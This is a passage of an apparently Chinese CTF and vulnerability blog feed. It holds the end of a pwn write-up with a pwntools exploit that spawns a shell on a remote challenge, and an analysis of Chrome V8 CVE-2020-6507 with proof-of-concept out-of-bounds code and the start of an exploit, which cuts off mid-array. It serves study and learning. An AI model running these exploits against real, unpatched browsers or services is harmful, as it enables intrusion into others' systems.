src="/2023/06/27/ret2dlresolve/%E5%9B%BE.jpg" class title="å›¾"><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26613</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Age &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&#x27;\x80&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Photo(URL) &gt;&gt; &#x27;</span>,p64(<span class="hljs-number">0xfbad1887</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\xb0\x5d&#x27;</span>)<br>pie=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-elf.symbols[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pie + <span class="hljs-number">0x4140</span> - <span class="hljs-number">0x67</span>) + <span class="hljs-string">b&#x27;system\x00&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;\x08&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;Name &gt;&gt; &#x27;</span>,payload)<br>payload = p64(pie + <span class="hljs-number">0x8</span>).ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(pie + <span class="hljs-number">0x4140</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Hobby &gt;&gt; &#x27;</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-6507</title>
    <link href="/2023/04/17/CVE-2020-6507/"/>
    <url>/2023/04/17/CVE-2020-6507/</url>
    
    <content type="html"><![CDATA[<p>CVEï¼*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚<br>ä¸€äº›ç¢ç¢å¿µï¼šæŠ˜è…¾äº†å¿«ä¸¤å‘¨äº†è¿˜æ²¡æ‘¸æ¸…æ¥šæ€ä¹ˆå­¦V8ï¼Œå…ˆæ¶è¡¥äº†ä¸€äº›V8çš„ç†è®ºä¹‹åæœ¬æ¥æƒ³çœ‹æºç ï¼Œä½†V8çš„æºç è¿‡äºå¤æ‚ï¼Œåœ¨å€”å¼ºåœ°æŒ£æ‰äº†ä¸€å‘¨åæˆ‘æ”¾å¼ƒäº†è¿™ä¸ªæƒ³æ³•ï¼Œæ‰“ç®—å…ˆæŒ‰ç…§åšå®¢å­¦æ¼æ´ï¼Œèµ°ä¸€æ­¥çœ‹ä¸€æ­¥(ã€‚_ã€‚)</p><span id="more"></span><p>bugç¼–å·1086890ï¼Œå—å½±å“çš„Chromeæœ€é«˜ç‰ˆæœ¬ä¸º83.0.4103.97ï¼Œå—å½±å“çš„V8æœ€é«˜ç‰ˆæœ¬ä¸º8.3.110.9 </p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>å…ˆè´´pocï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br>length_as_double =<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x2424242400000000n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">6</span>;<br>  x -= <span class="hljs-number">5</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">let</span> corrupting_array = [<span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>];<br>  <span class="hljs-keyword">let</span> corrupted_array = [<span class="hljs-number">0.1</span>];<br><br>  corrupting_array[x] = length_as_double;<br>  <span class="hljs-keyword">return</span> [corrupting_array, corrupted_array];<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  <span class="hljs-title function_">trigger</span>(giant_array);<br>&#125;<br><br>corrupted_array = <span class="hljs-title function_">trigger</span>(giant_array)[<span class="hljs-number">1</span>];<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;corrupted array length: &#x27;</span> + corrupted_array.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>corrupted_array[<span class="hljs-number">0x123456</span>];<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´çš„æˆå› æ˜¯ç”¨Turqueç¼–å†™çš„NewFixedArrayå’ŒNewFixedDoubleArrayæ²¡æœ‰å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//src\objects\fixed-array.tq</span><br><br>macro <span class="hljs-title class_">NewFixedArray</span>&lt;<span class="hljs-title class_">Iterator</span>: type&gt;(<span class="hljs-attr">length</span>: intptr, <span class="hljs-attr">it</span>: <span class="hljs-title class_">Iterator</span>): <span class="hljs-title class_">FixedArray</span> &#123;<br>  <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> kEmptyFixedArray;<br>  <span class="hljs-keyword">if</span> (length &gt; kFixedArrayMaxLength) deferred &#123;<br>      <span class="hljs-attr">runtime</span>::<span class="hljs-title class_">FatalProcessOutOfMemoryInvalidArrayLength</span>(kNoContext);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span><br>  <span class="hljs-title class_">FixedArray</span>&#123;<span class="hljs-attr">map</span>: kFixedArrayMap, <span class="hljs-attr">length</span>: <span class="hljs-title class_">Convert</span>&lt;<span class="hljs-title class_">Smi</span>&gt;(length), <span class="hljs-attr">objects</span>: ...it&#125;;<br>&#125;<br><br>macro <span class="hljs-title class_">NewFixedDoubleArray</span>&lt;<span class="hljs-title class_">Iterator</span>: type&gt;(<br>    <span class="hljs-attr">length</span>: intptr, <span class="hljs-attr">it</span>: <span class="hljs-title class_">Iterator</span>): <span class="hljs-title class_">FixedDoubleArray</span>|<span class="hljs-title class_">EmptyFixedArray</span> &#123;<br>  <span class="hljs-keyword">if</span> (length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> kEmptyFixedArray;<br>  <span class="hljs-keyword">if</span> (length &gt; kFixedDoubleArrayMaxLength) deferred &#123;<br>      <span class="hljs-attr">runtime</span>::<span class="hljs-title class_">FatalProcessOutOfMemoryInvalidArrayLength</span>(kNoContext);<br>    &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedDoubleArray</span>&#123;<br>    <span class="hljs-attr">map</span>: kFixedDoubleArrayMap,<br>    <span class="hljs-attr">length</span>: <span class="hljs-title class_">Convert</span>&lt;<span class="hljs-title class_">Smi</span>&gt;(length),<br>    <span class="hljs-attr">floats</span>: ...it<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>æºç ä¸­è§„å®škFixedDoubleArrayMaxLength &#x3D; 671088612ï¼Œæµ®ç‚¹å‹æ•°ç»„çš„æœ€å¤§é•¿åº¦ä¸º67108862<br>pocä¸­è¿™ä¸€æ®µæ“ä½œä½¿å¾—giant_arrayçš„æœ€ç»ˆé•¿åº¦ä¸º67108863</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br></code></pre></td></tr></table></figure><p>æ¼æ´æ˜¯ç”±äºæ²¡æœ‰æ£€æŸ¥æœ€å¤§é•¿åº¦é€ æˆçš„ï¼Œä½†ä¸æ˜¯ç”±å®ƒè§¦å‘çš„ï¼Œä»¥ä¸Šæ­¥éª¤æ­£å¸¸åœ°åˆ›å»ºäº†ä¸€ä¸ª67108863çš„æ•°ç»„giant_array<br>çœ‹è§¦å‘æ¼æ´çš„triggerå‡½æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">6</span>;<br>  x -= <span class="hljs-number">5</span>;<br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">let</span> corrupting_array = [<span class="hljs-number">0.1</span>, <span class="hljs-number">0.1</span>];<br>  <span class="hljs-keyword">let</span> corrupted_array = [<span class="hljs-number">0.1</span>];<br><br>  corrupting_array[x] = length_as_double;<br>  <span class="hljs-keyword">return</span> [corrupting_array, corrupted_array];<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  <span class="hljs-title function_">trigger</span>(giant_array);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ30000æ¬¡æ˜¯ä¸ºäº†è§¦å‘jitä¼˜åŒ–ï¼Œä¼šåˆ é™¤ä¸€äº›å†—ä½™ä»£ç <br>åœ¨ä¼˜åŒ–triggerå‡½æ•°çš„æ—¶å€™ï¼ŒV8è®¤ä¸ºxçš„æœ€å¤§é•¿åº¦ä¸º67108862ï¼Œé‚£ä¹ˆxæœ€åçš„è®¡ç®—ç»“æœæœ€å¤§å€¼ä¸º1ï¼Œé‚£ä¹ˆxæœ€åçš„å€¼ä¸æ˜¯0å°±æ˜¯1ï¼Œcorrupting_arrayçš„é•¿åº¦ä¸º2ï¼Œä¸è®ºå¯¹å…¶0è¿˜æ˜¯1èµ‹å€¼éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚åŸæœ¬ä»£ç åœ¨æ‰§è¡Œcorrupting_array[x]æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šæ ¹æ®xçš„å€¼å¯¹corrupting_arrayè¾¹ç•Œè¿›è¡Œæ£€æŸ¥ï¼Œä½†æ˜¯é€šè¿‡ä¸Šè¿°çš„åˆ†æï¼ŒJITè®¤ä¸ºè¿™ç§è¾¹ç•Œæ£€æŸ¥æ˜¯æ²¡æœ‰å¿…è¦çš„ï¼Œå°±æŠŠæ£€æŸ¥çš„ä»£ç ç»™åˆ é™¤äº†ã€‚è¿™æ ·å°±ç›´æ¥å¯¹corrupting_array[x]è¿›è¡Œèµ‹å€¼ï¼Œè€Œå®é™…çš„xå€¼ä¸º7ï¼Œè¿™å°±é€ æˆäº†è¶Šç•Œè¯»å†™ï¼Œè€Œindex&#x3D;7è¿™ä¸ªä½ç½®ï¼Œæ­£å¥½æ˜¯corrupted_arrayå˜é‡çš„elementså’Œlengthä½ï¼Œæ‰€ä»¥pocè¾¾åˆ°äº†ä¹‹å‰åˆ†æçš„é‚£ç§æ•ˆæœ</p><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>åˆæ˜¯ä¸€æ³¢ç¢ç¢å¿µï¼šV8æ¼æ´åˆ©ç”¨æ˜¯æ ¹æ®â€œä»0å¼€å§‹å­¦V8æ¼æ´åˆ©ç”¨â€ç³»åˆ—å­¦ä¹ çš„ï¼Œè¿™ä¸ªåšå®¢çš„ç¬¬ä¸€ç§æ–¹æ³•ååˆ†ç„å­¦ï¼Œä»£ç æœ‰ä¸€ç‚¹æ”¹åŠ¨éƒ½ä¼šå¯¼è‡´ä¸€åˆ‡é‡æ¥ï¼Œç”šè‡³è¿DebugPrintéƒ½ä¼šé€ æˆåœ°å€å˜åŠ¨ï¼Œæ‰€ä»¥æˆ‘æ”¾å¼ƒäº†è¿™ç§æ–¹æ³•ï¼Œç›´æ¥å¼€å§‹ä¼˜åŒ–è¿‡çš„åˆ©ç”¨<br>ä¼˜åŒ–è¿‡çš„pocå¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript">array = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">1.1</span>);<br>args = <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">fill</span>(array);<br>args.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Array</span>(<span class="hljs-number">0x40000</span> - <span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">2.2</span>));<br>giant_array = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">concat</span>.<span class="hljs-title function_">apply</span>([], args);<br>giant_array.<span class="hljs-title function_">splice</span>(giant_array.<span class="hljs-property">length</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>, <span class="hljs-number">3.3</span>);<br><br><br>length_as_double =<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>([<span class="hljs-number">0x22222222n</span>]).<span class="hljs-property">buffer</span>)[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">array, oob</span>) &#123;<br>  <span class="hljs-keyword">var</span> x = array.<span class="hljs-property">length</span>;<br>  x -= <span class="hljs-number">67108861</span>; <span class="hljs-comment">// 1 2</span><br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  x *= <span class="hljs-number">10</span>; <span class="hljs-comment">// 10 20</span><br>  x -= <span class="hljs-number">9</span>; <span class="hljs-comment">// 1 11</span><br>  x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x, <span class="hljs-number">0</span>);<br>  oob[x] = length_as_double; <span class="hljs-comment">// fake length</span><br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30000</span>; ++i) &#123;<br>  vul = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.1</span>];<br>  pad = [vul];<br>  double_array = [<span class="hljs-number">3.1</span>];<br>  obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">2.1</span>&#125;;<br>  obj_array = [obj];<br>  <span class="hljs-title function_">trigger</span>(giant_array, vul);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;length = &quot;</span>, double_array.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br></code></pre></td></tr></table></figure><p>forå¾ªç¯ä¸­ç”³è¯·çš„å‡ ä¸ªå¯¹è±¡çš„å†…å­˜å¸ƒå±€å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><img src="/2023/04/17/CVE-2020-6507/%E5%86%85%E5%AD%98.png" class title="å†…å­˜"><img src="/2023/04/17/CVE-2020-6507/vul.png" class title="vul"><img src="/2023/04/17/CVE-2020-6507/pad.png" class title="pad"><img src="/2023/04/17/CVE-2020-6507/doublearray.png" class title="doublearray"><img src="/2023/04/17/CVE-2020-6507/obj.png" class title="obj"><img src="/2023/04/17/CVE-2020-6507/objarray.png" class title="objarray"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">vul_elements<br>|32bit map addr|32bit length|64bit <span class="hljs-number">1.1</span>|64bit <span class="hljs-number">1.1</span>|<br>vuln<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>pad_elements<br>|32bit map addr|32bit length|32bit vuln addr|<br>pad<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>double_array_elements<br>|32bit map addr|32bit length|64bit <span class="hljs-number">3.1</span>|<br>double_array<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br>obj<br>|32bit map addr|32bit properties addr|32bit elements addr|128bit unknown data|<br>obj_array_elements<br>|32bit map addr|32bit length|32bit obj addr|<br>obj_array<br>|32bit map addr|32bit properties addr|32bit elements addr|32bit length|<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ç§æ–¹æ³•ä¹‹æ‰€ä»¥å¦‚æ­¤æŠ½è±¡æ˜¯å› ä¸ºè¦†ç›–çš„æ—¶å€™ä¼šå°†lengthå’Œelementsä¸€èµ·è¦†ç›–ï¼Œä¿®æ”¹åçš„pocåˆ©ç”¨padåˆ¶é€ äº†ä¸€ä¸ªåç§»ï¼Œè¿™æ ·è¦†ç›–çš„æ—¶å€™å°±æ˜¯è¦†ç›–double_arrayçš„lengthå’Œobjçš„map   </p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span 